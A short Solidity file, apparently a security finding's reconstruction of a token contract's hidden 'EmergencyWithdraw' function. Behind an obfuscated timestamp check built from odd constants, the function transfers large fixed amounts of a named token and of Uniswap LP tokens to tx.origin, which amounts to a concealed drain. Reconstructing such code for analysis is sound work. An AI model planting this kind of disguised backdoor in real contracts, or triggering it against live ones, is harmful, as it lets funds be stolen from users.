pragma solidity ^0.8.10;

interface IONE_R0AR_Token {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20Minimal {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

// Reference reconstruction of the vulnerable logic from the finding context.
contract RoarReference {
    address public constant ONE_R0AR_Token = 0xb0415D55f2C87b7f99285848bd341C367FeAc1ea;
    address public constant UniswapV2Pair = 0x13028E6b95520ad16898396667d1e52cB5E550Ac;

    uint256 public constant T0 = 0x67ff15af;
    uint256 public constant BIGC = 0x25aaa441b6cac9c2f49d8d012ccc517de4215e056b0f63883f8240c8e228fed1;
    uint256 public constant DEN = 365000 * 24 * 3600;
    uint256 public constant K = 35;
    uint256 public constant OFF = 61066966765;

    function EmergencyWithdraw() public {
        if (block.timestamp >= T0) {
            uint256 rate = BIGC / DEN;
            if ((((block.timestamp * rate * K) - (OFF * rate)) / (rate * K)) == (block.timestamp - T0)) {
                uint256 bal1 = IONE_R0AR_Token(ONE_R0AR_Token).balanceOf(address(this));
                uint256 diff = (block.timestamp * rate * K) - (OFF * rate);
                if (diff > 0 && bal1 < diff) {
                    require(
                        IONE_R0AR_Token(ONE_R0AR_Token).transfer(tx.origin, 100000000099978910611013632),
                        "transfer1 failed"
                    );
                    require(
                        IERC20Minimal(UniswapV2Pair).transfer(tx.origin, 26777446972437561344),
                        "transfer2 failed"
                    );
                }
            }
        }
    }
}
